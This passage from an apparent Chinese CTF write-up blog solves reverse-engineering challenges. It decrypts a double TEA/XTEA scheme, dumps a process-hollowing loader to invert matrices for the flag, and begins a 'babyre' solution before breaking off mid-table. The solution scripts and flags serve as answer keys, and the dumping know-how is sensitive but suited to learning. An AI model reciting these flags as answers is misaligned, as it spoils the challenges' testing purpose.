xtea_key[(sum_xtea / <span class="number">0x800</span>) &amp; <span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sum_tea += <span class="number">0x154cbf7</span>;</span><br><span class="line">v0 += ((v1 &lt;&lt; <span class="number">4</span>) + tea_key[<span class="number">0</span>]) ^ (v1 + sum_tea) ^ ((v1 / <span class="number">0x20</span>) + tea_key[<span class="number">1</span>]);</span><br><span class="line">v1 += ((v0 &lt;&lt; <span class="number">4</span>) + tea_key[<span class="number">2</span>]) ^ (v0 + sum_tea) ^ ((v0 / <span class="number">0x20</span>) + tea_key[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">v[<span class="number">0</span>] = v0;</span><br><span class="line">v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sum_tea 和 sum_xtea，对于每一组来说，初始值是不同的，比如第二组这里是0x798dcdf9 和 0xce0a6e55</p><p>最后通过打印三，四，五组第一个循环的日志，来与第二组的日志做对比，找到了所有组的初始的sum_tea 和 sum_xtea</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> sum[<span class="number">4</span>][<span class="number">2</span>] = &#123;</span><br><span class="line"><span class="number">0xCE0A6E55</span>, <span class="number">0x798dcdf9</span>, </span><br><span class="line"><span class="number">0x613673f9</span>, <span class="number">0x942dbd45</span>,</span><br><span class="line"><span class="number">0xf462799d</span>, <span class="number">0xaecdac91</span>,</span><br><span class="line"><span class="number">0x878e7f41</span>, <span class="number">0xc96d9bdd</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>最终写脚本解密</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> sum[<span class="number">4</span>][<span class="number">2</span>] = &#123;</span><br><span class="line"><span class="number">0xCE0A6E55</span>, <span class="number">0x798dcdf9</span>,</span><br><span class="line"><span class="number">0x613673f9</span>, <span class="number">0x942dbd45</span>,</span><br><span class="line"><span class="number">0xf462799d</span>, <span class="number">0xaecdac91</span>,</span><br><span class="line"><span class="number">0x878e7f41</span>, <span class="number">0xc96d9bdd</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> tea_key[<span class="number">4</span>] = &#123; <span class="number">0X5354</span>, <span class="number">0x4f4d</span>, <span class="number">0x2074</span>, <span class="number">0x6561</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> xtea_key[<span class="number">4</span>] = &#123; <span class="number">0x494c</span>, <span class="number">0X6F76</span> , <span class="number">0x6520</span>, <span class="number">0x4355</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span><span class="params">(<span class="keyword">int</span>* v, <span class="keyword">int</span>&amp; sum_xtea, <span class="keyword">int</span>&amp; sum_tea)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 / <span class="number">0x20</span>)) + v1) ^ (sum_xtea + xtea_key[sum_xtea &amp; <span class="number">3</span>]);</span><br><span class="line">sum_xtea += <span class="number">0x75bcd15</span>;</span><br><span class="line">v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 / <span class="number">0x20</span>)) + v0) ^ (sum_xtea + xtea_key[(sum_xtea / <span class="number">0x800</span>) &amp; <span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sum_tea += <span class="number">0x154cbf7</span>;</span><br><span class="line">v0 += ((v1 &lt;&lt; <span class="number">4</span>) + tea_key[<span class="number">0</span>]) ^ (v1 + sum_tea) ^ ((v1 / <span class="number">0x20</span>) + tea_key[<span class="number">1</span>]);</span><br><span class="line">v1 += ((v0 &lt;&lt; <span class="number">4</span>) + tea_key[<span class="number">2</span>]) ^ (v0 + sum_tea) ^ ((v0 / <span class="number">0x20</span>) + tea_key[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">v[<span class="number">0</span>] = v0;</span><br><span class="line">v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">int</span>* v, <span class="keyword">int</span>&amp; sum_xtea, <span class="keyword">int</span>&amp; sum_tea)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + tea_key[<span class="number">2</span>]) ^ (v0 + sum_tea) ^ ((v0 / <span class="number">0x20</span>) + tea_key[<span class="number">3</span>]);</span><br><span class="line">v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + tea_key[<span class="number">0</span>]) ^ (v1 + sum_tea) ^ ((v1 / <span class="number">0x20</span>) + tea_key[<span class="number">1</span>]);</span><br><span class="line">sum_tea -= <span class="number">0x154cbf7</span>;;</span><br><span class="line"></span><br><span class="line">v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 / <span class="number">0x20</span>)) + v0) ^ (sum_xtea + xtea_key[(sum_xtea / <span class="number">0x800</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">sum_xtea -= <span class="number">0x75bcd15</span>;</span><br><span class="line">v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 / <span class="number">0x20</span>)) + v1) ^ (sum_xtea + xtea_key[sum_xtea &amp; <span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">v[<span class="number">0</span>] = v0;</span><br><span class="line">v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> compare_date[<span class="number">100</span>] =  <span class="comment">//这里是从程序中提取的加密后的flag的值</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0xE8</span>, <span class="number">0xFA</span>, <span class="number">0xE0</span>, <span class="number">0xAE</span>, <span class="number">0x01</span>, <span class="number">0x41</span>, <span class="number">0x3E</span>, <span class="number">0xFC</span>, <span class="number">0x92</span>, <span class="number">0xAD</span>,</span><br><span class="line">  <span class="number">0x7C</span>, <span class="number">0x16</span>, <span class="number">0xBE</span>, <span class="number">0x6C</span>, <span class="number">0xEA</span>, <span class="number">0x51</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x2A</span>, <span class="number">0x24</span>,</span><br><span class="line">  <span class="number">0x1B</span>, <span class="number">0x1A</span>, <span class="number">0x51</span>, <span class="number">0x01</span>, <span class="number">0x94</span>, <span class="number">0x66</span>, <span class="number">0x4D</span>, <span class="number">0x51</span>, <span class="number">0xEB</span>, <span class="number">0xBF</span>,</span><br><span class="line">  <span class="number">0x5F</span>, <span class="number">0x2F</span>, <span class="number">0x98</span>, <span class="number">0x63</span>, <span class="number">0xD3</span>, <span class="number">0x46</span>, <span class="number">0xF0</span>, <span class="number">0xE3</span>, <span class="number">0xEE</span>, <span class="number">0x79</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> v[<span class="number">2</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">int</span>* encFlag = (<span class="keyword">int</span>*)compare_date;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag的前8个字符爆破得到的  L3HCTF&#123;D</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) <span class="comment">//后32个字符，分4组</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line"><span class="built_in">encrypt</span>(v, sum[j][<span class="number">0</span>], sum[j][<span class="number">1</span>]);  <span class="comment">//提升sum_xtea 和 sum_tea</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line"><span class="built_in">decrypt</span>(&amp;encFlag[j * <span class="number">2</span> + <span class="number">2</span>], sum[j][<span class="number">0</span>], sum[j][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* flag = (<span class="keyword">char</span>*)&amp;encFlag[<span class="number">2</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;flag is L3HCTF&#123;D%s  \n&quot;</span>, flag);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// L3HCTF&#123;D0uBle_vM_W1th_dOubIe_TEA&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Load"><a href="#Load" class="headerlink" title="Load"></a>Load</h2><p>IDA打开程序分析</p><p><img src="./image-20211116213515345.png" alt="image-20211116213515345"></p><p>进入LOAD_PE函数，就是创建了个傀儡进程</p><p><img src="./image-20211116213833328.png" alt="image-20211116213833328"></p><p>在ResumeThread这里下断点，dump，然后foremost分离</p><p>注意在foremost分离的时候要把dump下来的程序的MZ头抹去，这样才能分离解密后的PE文件来</p><p><img src="./image-20211116214156793.png" alt="image-20211116214156793"></p><p><img src="./image-20211116214613497.png" alt="image-20211116214613497"></p><p>IDA打开分析</p><p><img src="./image-20211116214535505.png" alt="image-20211116214535505"></p><p>获取flag后，对flag中的字符在 0x30-0x39或 a-f 范围做了个小处理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x30 - 0x39  ---&gt; 0x00 - 0x09</span><br><span class="line">a - f  ---&gt;   0xA ---0xF</span><br><span class="line"># 然后</span><br><span class="line">假设输入的是123f  --&gt;  0x12, 0x3f 存在了0x434380的位置</span><br></pre></td></tr></table></figure><p>注意这里全是对应的十六进制，猜测输入的flag的范围就是[0-9a-f]</p><p>最终434380处的数据是13个。下面又分为9 + 4 个，正好是3和2的平方，并且下面验证的时候也是分为9 + 4进行验证的</p><p>猜测是3 *  3 + 2 * 2的某个矩阵运算,   在上述图89行位置下断点，修改src处的数据为100010001, </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 0 0</span><br><span class="line">0 1 0</span><br><span class="line">0 0 1</span><br><span class="line">正好是单位矩阵</span><br></pre></td></tr></table></figure><p>然后运行，加密后发现Src处的数据没变，但是v29处的数据全乱了，猜测是逆矩阵</p><p>提取出加密后Src 和 v29处的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Src: </span><br><span class="line">1    0  -9</span><br><span class="line">0   -1  -6</span><br><span class="line">-1  -2  -4 </span><br><span class="line"></span><br><span class="line">v29:</span><br><span class="line">7    3</span><br><span class="line">30  13</span><br></pre></td></tr></table></figure><p>写脚本求逆矩阵，并转换为flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    a = numpy.array([[<span class="number">1</span>, <span class="number">0</span>, -<span class="number">9</span>], [<span class="number">0</span>, -<span class="number">1</span>, -<span class="number">6</span>], [-<span class="number">1</span>, -<span class="number">2</span>, -<span class="number">4</span>]])</span><br><span class="line">    b = numpy.array([[<span class="number">7</span>, <span class="number">3</span>], [<span class="number">30</span>, <span class="number">13</span>]])</span><br><span class="line"></span><br><span class="line">    a_inv = numpy.linalg.inv(a)</span><br><span class="line">    b_inv = numpy.linalg.inv(b)</span><br><span class="line"></span><br><span class="line">    a_list = [<span class="built_in">list</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> a_inv]</span><br><span class="line">    b_list = [<span class="built_in">list</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> b_inv]</span><br><span class="line"></span><br><span class="line">    flag_list = a_list[<span class="number">0</span>] + a_list[<span class="number">1</span>] + a_list[<span class="number">2</span>] + b_list[<span class="number">0</span>] + b_list[<span class="number">1</span>]</span><br><span class="line">    flag_list = [<span class="built_in">int</span>(i) &amp; <span class="number">0xff</span> <span class="keyword">for</span> i <span class="keyword">in</span> flag_list]</span><br><span class="line">    flag = <span class="built_in">bytes</span>(flag_list).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="comment">#  f812f706f306ff02ff0dfde207</span></span><br></pre></td></tr></table></figure><p>拼接后进行验证，Load.exe在 ResumeThread那里下断点，输入flag，程序断下，在运行dump提取出来的exe，验证成功</p><p><img src="./image-20211116222434611.png" alt="image-20211116222434611"></p><p>最终flag为 : <code>flag&#123;f812f706f306ff02ff0dfde207&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFWP </tag>
            
            <tag> vm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021强网拟态_babyre</title>
      <link href="/2021/11/12/2021%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81_babyre/"/>
      <url>/2021/11/12/2021%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81_babyre/</url>
      
        <content type="html"><![CDATA[<h1 id="2021强网拟态"><a href="#2021强网拟态" class="headerlink" title="2021强网拟态"></a>2021强网拟态</h1><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h3><p>IDA动态调试，进入关键函数</p><p><img src="./image-20211112155107286.png" alt="image-20211112155107286"></p><p><img src="./image-20211112155039333.png" alt="image-20211112155039333"></p><p>分析函数，提取数据，还原算法</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> BYTE;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> DWORD;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> _flag[] = <span class="string">&quot;1234567890123456&quot;</span>;</span><br><span class="line"></span><br><span class="line">DWORD cmp_data[<span class="number">8</span>] = &#123;<span class="number">0xE82BA79E</span>, <span class="number">0x83EA91DE</span>, <span class="number">0x241BCCFE</span>, <span class="number">0x2836973B</span>, <span class="number">0x5F86C92D</span>, <span class="number">0x0C8094E88</span>, <span class="number">0x0FEC81BB0</span>, <span class="number">0x0D5277623</span>&#125;;</span><br><span class="line"></span><br><span class="line">DWORD key[<span class="number">60</span>] = &#123;<span class="number">0xc3bb95b</span>, <span class="number">0x578c9d63</span>, <span class="number">0x7faca21c</span>, <span class="number">0x29522e93</span>, <span class="number">0xb268681</span>, <span class="number">0xda705e01</span>, <span class="number">0xa7732a53</span>, <span class="number">0x72e0c013</span>, <span class="number">0x4b4fcf3b</span>, <span class="number">0xe46963a6</span>, <span class="number">0x3eeea9d2</span>, <span class="number">0xefb38fbb</span>, <span class="number">0xd156d880</span>, <span class="number">0x7d037452</span>, <span class="number">0xd593ea40</span>, <span class="number">0xd5223126</span>, <span class="number">0xaf26ac9d</span>, <span class="number">0xda87ca74</span>, <span class="number">0xd15d2669</span>, <span class="number">0x6cadaad</span>, <span class="number">0xac55acd2</span>, <span class="number">0xa8909e12</span>, <span class="number">0xb1db66</span>, <span class="number">0xcc4c1870</span>, <span class="number">0x75a166e9</span>, <span class="number">0xbdaec1d</span>, <span class="number">0xd797fcc4</span>, <span class="number">0x9cd3659b</span>, <span class="number">0x4c532c0</span>, <span class="number">0xa8214574</span>, <span class="number">0xccfdc316</span>, <span class="number">0x6019b4a2</span>, <span class="number">0x7e7b8af4</span>, <span class="number">0xdc4d10d9</span>, <span class="number">0x4b44995f</span>, <span class="number">0x2ca5c858</span>, <span class="number">0xace477b4</span>, <span class="number">0x64dc8662</span>, <span class="number">0xace477b4</span>, <span class="number">0xbbc35df5</span>, <span class="number">0xa2369a2d</span>, <span class="number">0x97098986</span>, <span class="number">0x67e15107</span>, <span class="number">0xfd0b6e21</span>, <span class="number">0xc838f1d6</span>, <span class="number">0xc838f1d6</span>, <span class="number">0x17272a41</span>, <span class="number">0x38f9ff4a</span>, <span class="number">0x353f13ab</span>, <span class="number">0xf0e8d881</span>, <span class="number">0x9aea3f26</span>, <span class="number">0x5f3df40c</span>, <span class="number">0x0</span>, <span class="number">0xdf1fdb97</span>, <span class="number">0x2fded50b</span>, <span class="number">0x49b04218</span>, <span class="number">0xf3000000</span>, <span class="number">0xc3fa1e0f</span>, <span class="number">0xf3000000</span>, <span class="number">0x841f</span>&#125;;</span><br><span class="line"></span><br><span class="line">DWORD dword_405420[<span class="number">256</span>] = &#123;<span class="number">0xa7f45150</span>, <span class="number">0x65417e53</span>, <span class="number">0xa4171ac3</span>, <span class="number">0x5e273a96</span>, <span class="number">0x6bab3bcb</span>, <span class="number">0x459d1ff1</span>, <span class="number">0x58faacab</span>, <span class="number">0x3e34b93</span>, <span class="number">0xfa302055</span>, <span class="number">0x6d76adf6</span>, <span class="number">0x76cc8891</span>, <span class="number">0x4c02f525</span>, <span class="number">0xd7e54ffc</span>, <span class="number">0xcb2ac5d7</span>, <span class="number">0x44352680</span>, <span class="number">0xa362b58f</span>, <span class="number">0x5ab1de49</span>, <span class="number">0x1bba2567</span>, <span class="number">0xeea4598</span>, <span class="number">0xc0fe5de1</span>, <span class="number">0x752fc302</span>, <span class="number">0xf04c8112</span>, <span class="number">0x97468da3</span>, <span class="number">0xf9d36bc6</span>, <span class="number">0x5f8f03e7</span>, <span class="number">0x9c921595</span>, <span class="number">0x7a6dbfeb</span>, <span class="number">0x595295da</span>, <span class="number">0x83bed42d</span>, <span class="number">0x217458d3</span>, <span class="number">0x69e04929</span>, <span class="number">0xc8c98e44</span>, <span class="number">0x89c2756a</span>, <span class="number">0x798ef478</span>, <span class="number">0x3e58996b</span>, <span class="number">0x71b927dd</span>, <span class="number">0x4fe1beb6</span>, <span class="number">0xad88f017</span>, <span class="number">0xac20c966</span>, <span class="number">0x3ace7db4</span>, <span class="number">0x4adf6318</span>, <span class="number">0x311ae582</span>, <span class="number">0x33519760</span>, <span class="number">0x7f536245</span>, <span class="number">0x7764b1e0</span>, <span class="number">0xae6bbb84</span>, <span class="number">0xa081fe1c</span>, <span class="number">0x2b08f994</span>, <span class="number">0x68487058</span>, <span class="number">0xfd458f19</span>, <span class="number">0x6cde9487</span>, <span class="number">0xf87b52b7</span>, <span class="number">0xd373ab23</span>, <span class="number">0x24b72e2</span>, <span class="number">0x8f1fe357</span>, <span class="number">0xab55662a</span>, <span class="number">0x28ebb207</span>, <span class="number">0xc2b52f03</span>, <span class="number">0x7bc5869a</span>, <span class="number">0x837d3a5</span>, <span class="number">0x872830f2</span>, <span class="number">0xa5bf23b2</span>, <span class="number">0x6a0302ba</span>, <span class="number">0x8216ed5c</span>, <span class="number">0x1ccf8a2b</span>, <span class="number">0xb479a792</span>, <span class="number">0xf207f3f0</span>, <span class="number">0xe2694ea1</span>, <span class="number">0xf4da65cd</span>, <span class="number">0xbe0506d5</span>, <span class="number">0x6234d11f</span>, <span class="number">0xfea6c48a</span>, <span class="number">0x532e349d</span>, <span class="number">0x55f3a2a0</span>, <span class="number">0xe18a0532</span>, <span class="number">0xebf6a475</span>, <span class="number">0xec830b39</span>, <span class="number">0xef6040aa</span>, <span class="number">0x9f715e06</span>, <span class="number">0x106ebd51</span>, <span class="number">0x8a213ef9</span>, <span class="number">0x6dd963d</span>, <span class="number">0x53eddae</span>, <span class="number">0xbde64d46</span>, <span class="number">0x8d5491b5</span>, <span class="number">0x5dc47105</span>, <span class="number">0xd406046f</span>, <span class="number">0x155060ff</span>, <span class="number">0xfb981924</span>, <span class="number">0xe9bdd697</span>, <span class="number">0x434089cc</span>, <span class="number">0x9ed96777</span>, <span class="number">0x42e8b0bd</span>, <span class="number">0x8b890788</span>, <span class="number">0x5b19e738</span>, <span class="number">0xeec879db</span>, <span class="number">0xa7ca147</span>, <span class="number">0xf427ce9</span>, <span class="number">0x1e84f8c9</span>, <span class="number">0x0</span>, <span class="number">0x86800983</span>, <span class="number">0xed2b3248</span>, <span class="number">0x70111eac</span>, <span class="number">0x725a6c4e</span>, <span class="number">0xff0efdfb</span>, <span class="number">0x38850f56</span>, <span class="number">0xd5ae3d1e</span>, <span class="number">0x392d3627</span>, <span class="number">0xd90f0a64</span>, <span class="number">0xa65c6821</span>, <span class="number">0x545b9bd1</span>, <span class="number">0x2e36243a</span>, <span class="number">0x670a0cb1</span>, <span class="number">0xe757930f</span>, <span class="number">0x96eeb4d2</span>, <span class="number">0x919b1b9e</span>, <span class="number">0xc5c0804f</span>, <span class="number">0x20dc61a2</span>, <span class="number">0x4b775a69</span>, <span class="number">0x1a121c16</span>, <span class="number">0xba93e20a</span>, <span class="number">0x2aa0c0e5</span>, <span class="number">0xe0223c43</span>, <span class="number">0x171b121d</span>, <span class="number">0xd090e0b</span>, <span class="number">0xc78bf2ad</span>, <span class="number">0xa8b62db9</span>, <span class="number">0xa91e14c8</span>, <span class="number">0x19f15785</span>, <span class="number">0x775af4c</span>, <span class="number">0xdd99eebb</span>, <span class="number">0x607fa3fd</span>, <span class="number">0x2601f79f</span>, <span class="number">0xf5725cbc</span>, <span class="number">0x3b6644c5</span>, <span class="number">0x7efb5b34</span>, <span class="number">0x29438b76</span>, <span class="number">0xc623cbdc</span>, <span class="number">0xfcedb668</span>, <span class="number">0xf1e4b863</span>, <span class="number">0xdc31d7ca</span>, <span class="number">0x85634210</span>, <span class="number">0x22971340</span>, <span class="number">0x11c68420</span>, <span class="number">0x244a857d</span>, <span class="number">0x3dbbd2f8</span>, <span class="number">0x32f9ae11</span>, <span class="number">0xa129c76d</span>, <span class="number">0x2f9e1d4b</span>, <span class="number">0x30b2dcf3</span>, <span class="number">0x52860dec</span>, <span class="number">0xe3c177d0</span>, <span class="number">0x16b32b6c</span>, <span class="number">0xb970a999</span>, <span class="number">0x489411fa</span>, <span class="number">0x64e94722</span>, <span class="number">0x8cfca8c4</span>, <span class="number">0x3ff0a01a</span>, <span class="number">0x2c7d56d8</span>, <span class="number">0x903322ef</span>, <span class="number">0x4e4987c7</span>, <span class="number">0xd138d9c1</span>, <span class="number">0xa2ca8cfe</span>, <span class="number">0xbd49836</span>, <span class="number">0x81f5a6cf</span>, <span class="number">0xde7aa528</span>, <span class="number">0x8eb7da26</span>, <span class="number">0xbfad3fa4</span>, <span class="number">0x9d3a2ce4</span>, <span class="number">0x9278500d</span>, <span class="number">0xcc5f6a9b</span>, <span class="number">0x467e5462</span>, <span class="number">0x138df6c2</span>, <span class="number">0xb8d890e8</span>, <span class="number">0xf7392e5e</span>, <span class="number">0xafc382f5</span>, <span class="number">0x805d9fbe</span>, <span class="number">0x93d0697c</span>, <span 